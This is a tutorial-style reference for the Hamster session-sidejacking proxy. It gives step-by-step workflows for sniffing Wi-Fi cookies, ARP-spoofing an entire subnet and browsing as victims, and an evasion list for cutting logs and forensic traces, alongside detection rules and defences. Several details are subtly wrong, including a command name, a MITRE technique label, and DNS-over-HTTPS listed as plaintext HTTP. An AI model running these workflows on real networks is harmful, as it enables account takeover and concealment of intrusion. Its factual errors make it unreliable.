---
tool_name: "hamster-sidejack"
display_name: "Hamster"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "session_hijacking"
install_command: "sudo apt install hamster-sidejack"
version: "2.0"
github_repo: "http://www.erratasec.com/research.html"
kali_tools_page: "https://www.kali.org/tools/hamster-sidejack/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["session-hijacking", "sidejacking", "cookie-replay", "proxy", "http", "credential-theft"]
related_tools: ["ferret-sidejack", "bettercap", "wireshark", "tcpdump"]
---

# Hamster - HTTP Session Sidejacking Proxy

## Chapter 1: Introduction & Overview

### What is Hamster?

Hamster is a session sidejacking tool that acts as a proxy server replacing your browser's cookies with session cookies stolen from somebody else, allowing you to hijack their web sessions. It reads captured cookie data (typically harvested by Ferret) and injects those cookies into HTTP requests flowing through its proxy, enabling the attacker to access authenticated web sessions without knowing the victim's credentials.

### History & Background

- **Created:** Robert David Graham (Errata Security)
- **Version:** 2.0
- **License:** Open source
- **Language:** C++
- **Companion Tool:** Ferret (cookie harvester)

Hamster and Ferret are the classic sidejacking duo — Ferret passively captures cookies from the network, Hamster uses those cookies to hijack sessions. The name "Hamster" is a play on "sidejacking" (originally coined by Robert Graham for this type of attack).

### When to Use This Tool

- **Penetration testing:** Demonstrate HTTP session hijacking risks
- **Red team engagements:** Access internal web applications using captured sessions
- **Wireless assessments:** Show risks of unencrypted Wi-Fi
- **Network forensics:** Replay captured session data
- **CTF challenges:** Session hijacking challenges

### When NOT to Use This Tool

- Without authorization to access the target sessions
- Against encrypted HTTPS traffic (Hamster only handles HTTP)
- To access accounts without authorization
- Against production systems without scope agreement

### Legal and Ethical Considerations

- **Session hijacking is unauthorized access** — requires explicit written authorization
- **Captured sessions provide full account access** — treat data as highly sensitive
- **HTTP-only** — HTTPS traffic cannot be hijacked with this tool
- **Requires Ferret** — cookies must be captured first via network sniffing
- **Document everything** — maintain evidence of what was accessed and when

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Sidejacking** | Hijacking a web session by stealing and replaying session cookies |
| **Proxy Server** | Hamster sits between browser and internet, modifying requests |
| **Cookie Injection** | Replacing browser cookies with captured victim cookies |
| **Session Replay** | Using captured authentication tokens to access victim sessions |
| **Plaintext HTTP** | Hamster only works with unencrypted HTTP traffic |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux recommended)
- **Root access:** Not required for Hamster (only for Ferret capture)
- **Browser:** Any browser that supports HTTP proxy configuration
- **Companion:** Ferret-sidejack for cookie capture

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install hamster-sidejack
```

#### Method 2: Dependencies Check

```bash
# Hamster has minimal dependencies
ldd $(which hamster-sidejack)
# Should show: libstdc++, libgcc, libc
```

### Verify Installation

```bash
hamster-sidejack
```

**Output:**
```
--- HAMPSTER 2.0 side-jacking tool ---
Set browser to use proxy http://127.0.0.1:1234
DEBUG: set_ports_option(1234)
DEBUG: mg_open_listening_port(1234)
Proxy: listening on 127.0.0.1:1234
begining thread
```

### Browser Proxy Configuration

**Firefox:**
```
Settings → Network Settings → Manual Proxy Configuration
  HTTP Proxy: 127.0.0.1
  Port: 1234
  ☐ Use this proxy server for all protocols
```

**Chrome (via command line):**
```bash
google-chrome --proxy-server="http://127.0.0.1:1234"
```

**Command-line (curl):**
```bash
curl -x http://127.0.0.1:1234 http://target-site.com
```

---

## Chapter 3: Architecture & Operation

### Operation Flow

```
1. Ferret captures cookies from network traffic
2. Hamster starts proxy server on port 1234
3. Hamster reads captured cookie data
4. Browser configured to proxy through Hamster
5. Browser sends HTTP request through Hamster
6. Hamster intercepts request
7. Hamster replaces cookies with captured victim cookies
8. Request forwarded to target with victim's session
9. Target responds with victim's authenticated content
10. Hamster returns response to browser
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Steal Web Session Cookie | T1539 | Capture session cookies |
| Web Service Client Communications | T1071.001 | HTTP protocol session replay |
| Man-in-the-Middle | T1557 | Intercept and modify HTTP traffic |

### Architecture

```
┌──────────┐     HTTP      ┌──────────┐     HTTP      ┌──────────┐
│  Browser  │ ──────────→ │  Hamster  │ ──────────→ │  Website  │
│ (Proxied) │ ←────────── │  Proxy    │ ←────────── │ (Server)  │
└──────────┘              │  :1234    │              └──────────┘
                          └────┬─────┘
                               │
                          ┌────┴─────┐
                          │ Ferret   │
                          │ Cookie   │
                          │ Capture  │
                          └──────────┘
```

### Cookie File Format

Hamster reads cookies from Ferret's output:

```
# Ferret output format (simplified)
Cookie: session_id=ABC123XYZ; Domain=.example.com; Path=/
Cookie: user_token=DEF456; Domain=.example.com; Path=/
Cookie: csrf_token=GHI789; Domain=.example.com; Path=/
```

---

## Chapter 4: Command Reference

### Basic Operation

#### Start Hamster Proxy

```bash
hamster-sidejack
```

**Explanation:** Start the Hamster proxy on the default port (1234). Configure your browser to use this proxy.

#### Start on Custom Port

```bash
hamster-sidejack -p 8888
```

**Explanation:** Start Hamster on a custom port (if 1234 is occupied).

#### Quiet Mode

```bash
hamster-sidejack -q
```

**Explanation:** Start Hamster without verbose output.

### Usage Flow

```bash
# Step 1: Capture cookies with Ferret (in another terminal)
sudo ferret-sidejack -i wlan0

# Step 2: Start Hamster
hamster-sidejack

# Step 3: Configure browser proxy to 127.0.0.1:1234

# Step 4: Navigate to victim's website
# Hamster automatically injects captured cookies

# Step 5: Browse as the victim
```

### Cookie Management

```bash
# Hamster reads cookies from Ferret's default output location
ls ~/hamster/
ls /tmp/ferret*.log

# Clear captured cookies
rm ~/hamster/cookies.txt

# View captured cookies
cat ~/hamster/cookies.txt
```

### Complete Flags Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-p` | Custom proxy port | `-p 8888` |
| `-q` | Quiet mode | `-q` |
| `-h` | Print help | `-h` |

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: WiFi Session Hijacking

**Setup:**

```bash
# Step 1: Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Step 2: Capture cookies with Ferret
sudo ferret-sidejack -i wlan0mon 2>&1 | tee cookies.log &

# Step 3: Start Hamster proxy
hamster-sidejack &

# Step 4: Configure browser proxy
# HTTP Proxy: 127.0.0.1, Port: 1234

# Step 5: Browse to captured session sites
```

**Attack Flow:**
1. Ferret passively captures HTTP cookies from the WiFi network
2. Hamster reads the captured cookies
3. Browser sends all HTTP traffic through Hamster
4. Hamster replaces cookies with victim's cookies
5. Victim's authenticated sessions are accessible

**Limitations:** Only works against HTTP websites. Modern browsers show "Not Secure" warnings for HTTP.

### Scenario 2: Internal Network Session Capture

```bash
# On internal network (no HTTPS on legacy apps)
# Step 1: Position for traffic interception
sudo arp-spoof -i eth0 -t 192.168.1.0/24 192.168.1.1 &

# Step 2: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 3: Capture cookies
sudo ferret-sidejack -i eth0 2>&1 | tee internal_cookies.log &

# Step 4: Start Hamster
hamster-sidejack &

# Step 5: Access internal applications via proxy
# Internal HTTP admin panels, printer interfaces, etc.
```

### Scenario 3: Multi-Session Management

```bash
# Capture cookies from multiple sites
sudo ferret-sidejack -i eth0

# Start Hamster
hamster-sidejack

# In browser, navigate to different sites:
# - http://internal-app.company.com → uses captured session for internal app
# - http://printer.company.com → uses captured printer admin session
# - http://monitoring.company.com → uses captured monitoring session
```

**Key Insight:** Hamster maintains cookies per-domain, so navigating to different captured sites uses the appropriate session for each.

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Network Detection:**
- HTTP traffic to port 1234 (Hamster's default port)
- Proxy requests with modified cookies
- Unusual HTTP header patterns (injected cookies)

**Host-Based Detection:**
- Hamster process running on the system
- Browser proxy configuration pointing to localhost
- Ferret cookie files in default locations

**IDS/IPS Rules:**

```
# Snort rule for Hamster proxy traffic
alert tcp any 1234 -> any any (msg:"Hamster Proxy Traffic"; \
  content:"Cookie:"; sid:1000001; rev:1;)
```

### Evasion Techniques

1. **Custom Port:** Run Hamster on a non-standard port
2. **HTTPS Only:** Modern sites use HTTPS, making Ferret/Hamster less effective
3. **Encrypted Channels:** Use VPN or SSH tunneling for the proxy connection
4. **Minimal Logging:** Use quiet mode to reduce forensic evidence
5. **Temporary Files:** Clear cookie files after each session

### Blue Team Countermeasures

- **Enforce HTTPS:** Use HSTS headers to prevent HTTP fallback
- **Secure Cookie Flags:** Set `Secure`, `HttpOnly`, `SameSite` on all cookies
- **Network Segmentation:** Isolate sensitive traffic on separate VLANs
- **802.1X:** Require authentication for network access
- **Promiscuous Mode Detection:** Monitor for ARP anomalies
- **Browser Security:** Disable HTTP proxy for internal sites
- **Certificate Transparency:** Monitor for unauthorized certificates

---

## Chapter 7: Integration with Other Tools

### Ferret-Sidejack Integration

Hamster and Ferret are designed to work together:

```bash
# Terminal 1: Ferret captures cookies
sudo ferret-sidejack -i wlan0

# Terminal 2: Hamster uses captured cookies
hamster-sidejack
# Proxy listening on 127.0.0.1:1234
```

**Key Points:**
- Ferret must run first to capture cookies
- Hamster reads Ferret's output file
- Both tools share the same cookie file format
- Ferret is passive; Hamster is the active proxy

### BetterCAP Integration

```bash
# BetterCAP for ARP spoofing + traffic capture
sudo bettercap -iface eth0

# In BetterCAP console:
# set arp.spoof.targets 192.168.1.0/24
# arp.spoof on
# net.sniff on

# Hamster processes the intercepted traffic
hamster-sidejack
```

### Wireshark Analysis

```bash
# Capture with Wireshark, then extract cookies
# In Wireshark: Follow TCP Stream → Extract cookies

# Or use tshark for command-line extraction
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie > cookies.txt

# Hamster can read the extracted cookies
hamster-sidejack
```

### curl Testing

```bash
# Test captured cookies directly with curl
curl -x http://127.0.0.1:1234 http://target-site.com/dashboard

# Compare with direct access (should show unauthenticated)
curl http://target-site.com/dashboard
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Hamster not starting**

```bash
# Check if port 1234 is in use
ss -lntp | grep :1234

# Kill existing Hamster process
pkill hamster-sidejack

# Try a different port
hamster-sidejack -p 8888
```

**Issue: Browser not using proxy**

```bash
# Verify proxy settings in Firefox
# Settings → Network Settings → Manual Proxy Configuration
# HTTP Proxy: 127.0.0.1, Port: 1234

# For Chrome, must launch with proxy flag:
google-chrome --proxy-server="http://127.0.0.1:1234"

# Test proxy is working
curl -x http://127.0.0.1:1234 http://httpbin.org/ip
```

**Issue: Cookies not being injected**

```bash
# Check if Ferret output exists
ls ~/hamster/cookies.txt
ls /tmp/ferret*.log

# Verify cookie file has content
wc -l ~/hamster/cookies.txt

# Ensure cookies are for the right domain
grep "example.com" ~/hamster/cookies.txt

# Clear browser cookies and cache
# Hamster replaces cookies, but cached content may interfere
```

**Issue: HTTPS sites not working**

```bash
# Hamster cannot proxy HTTPS traffic
# This is expected behavior — HTTPS encrypts cookies
# Only HTTP sites can be hijacked with this method

# Check if target site uses HTTPS
curl -I http://target-site.com
# If redirected to HTTPS, Hamster won't work for that site
```

**Issue: Only seeing some sessions**

```bash
# Ferret only captures HTTP cookies
# Most modern sites redirect HTTP → HTTPS
# Check what HTTP traffic exists on the network
sudo tcpdump -i eth0 port 80 -c 50

# If no HTTP traffic, all sites use HTTPS
# Ferret/Hamster approach won't work
```

### Debug Mode

```bash
# Run Hamster with verbose output
hamster-sidejack 2>&1 | tee hamster_debug.log

# Check for connection errors
grep -i "error\|fail\|timeout" hamster_debug.log

# Monitor cookie injection
tail -f hamster_debug.log
```

### Cookie File Management

```bash
# Find all Ferret cookie files
find / -name "cookies.txt" -o -name "ferret*.log" 2>/dev/null

# Merge multiple cookie files
cat cookie_file1.txt cookie_file2.txt > merged_cookies.txt

# Clean up after testing
rm -f ~/hamster/cookies.txt
rm -f /tmp/ferret*.log
```

---

## Chapter 9: HTTP Cookie Security Analysis

### Cookie Flags and Sidejacking

```bash
# Analyze captured cookies for security weaknesses
# Hamster targets cookies WITHOUT security flags

# Secure flag - prevents cookie sent over HTTP
# HttpOnly flag - prevents JavaScript access
# SameSite flag - prevents cross-site sending

# Ferret captures HTTP cookies (no Secure flag)
# If a cookie is sent over HTTP, it's vulnerable to sidejacking

# Check for vulnerable cookies
grep -i "set-cookie" captured_traffic.txt | grep -v -i "secure\|httponly\|samesite"
```

### Session Token Analysis

```bash
# Analyze captured session tokens for entropy
# Weak tokens are vulnerable to brute-force

# Check token length
cat ~/hamster/cookies.txt | awk '{print length($0)}' | sort -n | head -5

# Check for predictable patterns
grep -oP 'session_id=\K[^;]+' ~/hamster/cookies.txt | head -10

# Entropy analysis
python3 -c "
import math
from collections import Counter

tokens = open('/tmp/tokens.txt').read().splitlines()
for token in tokens[:5]:
    freq = Counter(token)
    entropy = -sum((c/len(token)) * math.log2(c/len(token)) for c in freq.values())
    print(f'Token: {token[:20]}... Length: {len(token)} Entropy: {entropy:.2f} bits/char')
"
```

---

## Chapter 10: Modern Context and Limitations

### Why HTTPS Limits Hamster

```
Modern web security has largely eliminated HTTP-only session cookies:

1. HSTS (HTTP Strict Transport Security)
   - Forces HTTPS for all connections
   - Preloaded in major browsers
   - Prevents HTTP downgrade attacks

2. Secure Flag on Cookies
   - Cookies only sent over HTTPS
   - Cannot be captured by network sniffing

3. SameSite Cookie Attribute
   - LAX: Sent only in top-level navigation
   - STRICT: Never sent cross-site
   - Prevents CSRF and some session theft

4. Browser HTTPS-Only Mode
   - Firefox: HTTPS-Only Mode
   - Chrome: HTTPS-First Mode
   - Warns before loading HTTP pages
```

### Remaining Attack Surface

```bash
# HTTP traffic that still exists:
# - Legacy internal applications
# - IoT devices (cameras, printers, smart TVs)
# - Development/staging environments
# - Internal admin panels
# - Some API endpoints
# - DNS-over-HTTP (DoH) connections
# - CDN edge connections

# Scan for HTTP traffic on network
sudo tcpdump -i eth0 port 80 -nn -c 100 | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn
```

### Alternative: HTTPS Session Hijacking

```bash
# For HTTPS session hijacking, different tools are needed:
# - bettercap (with TLS proxy)
# - mitmproxy (certificate interception)
# - sslstrip + sslsniff (HTTP downgrade + MITM)
# - Responder + NTLM relay (for Windows)

# Example with bettercap
sudo bettercap -iface eth0
# set arp.spoof.targets 192.168.1.0/24
# set net.sniff.ssl true
# arp.spoof on
# net.sniff on
```

---

## Chapter 11: Network Forensics with Hamster

### Evidence Collection

```bash
# Document the attack for penetration testing reports

# Step 1: Capture network traffic
sudo tcpdump -i eth0 -w evidence_capture.pcap port 80 &

# Step 2: Run Ferret to capture cookies
sudo ferret-sidejack -i eth0 2>&1 | tee ferret_evidence.log &

# Step 3: Start Hamster and document actions
hamster-sidejack 2>&1 | tee hamster_evidence.log &

# Step 4: Screenshot browser showing hijacked sessions
# Use scrot or similar tool

# Step 5: Clean up
pkill ferret-sidejack
pkill hamster-sidejack
rm -f ~/hamster/cookies.txt
```

### PCAP Analysis for HTTP Cookies

```bash
# Extract cookies from PCAP with tshark
tshark -r capture.pcap -Y "http.cookie" -T fields \
  -e http.cookie -e http.host -e http.request.uri | head -20

# Extract full HTTP streams
tshark -r capture.pcap -q -z conv,http

# Follow TCP stream containing cookies
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

---

## Chapter 12: Defense and Mitigation

### Server-Side Defenses

```
1. Set Secure flag on all cookies:
   Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict

2. Implement HSTS:
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

3. Use short session timeouts:
   Session expires after 15-30 minutes of inactivity

4. Bind sessions to client attributes:
   - IP address (may break mobile users)
   - User-Agent string
   - TLS session ticket

5. Implement session rotation:
   - Regenerate session ID after login
   - Regenerate periodically

6. Use anti-CSRF tokens:
   - Prevents cross-site request forgery
   - Additional layer beyond SameSite
```

### Network-Side Defenses

```bash
# 1. Enforce 802.1X for network access
# Requires authentication before getting network access

# 2. Deploy NAC (Network Access Control)
# Checks device compliance before allowing access

# 3. Segment sensitive traffic
# VLANs for different trust levels
# Firewall rules between segments

# 4. Monitor for ARP anomalies
# arpwatch detects ARP table changes
sudo apt install arpwatch
sudo systemctl enable arpwatch

# 5. Deploy Network IDS
# Snort/Suricata rules for sidejacking detection
```

### Client-Side Defenses

```
1. Browser Extensions:
   - HTTPS Everywhere (force HTTPS)
   - NoScript (block JavaScript)

2. VPN Usage:
   - Encrypts all traffic
   - Prevents WiFi sniffing

3. Browser Settings:
   - Enable HTTPS-Only Mode
   - Disable proxy auto-configuration
   - Clear cookies on browser close
```

---

## Resources

- **Errata Security:** http://www.erratasec.com/research.html
- **Ferret-Sidejack:** https://www.kali.org/tools/ferret-sidejack/
- **Kali Documentation:** https://www.kali.org/tools/hamster-sidejack/
- **BetterCAP:** https://www.bettercap.org
- **Wireshark:** https://www.wireshark.org
- **OWASP Session Management:** https://owasp.org/www-community/attacks/Session_hijacking
- **RFC 6265 (HTTP Cookies):** https://tools.ietf.org/html/rfc6265
- **RFC 6797 (HSTS):** https://tools.ietf.org/html/rfc6797
- **RFC 6265bis:** https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis
- **NIST SP 800-123:** https://csrc.nist.gov/publications/detail/sp/800-123/final
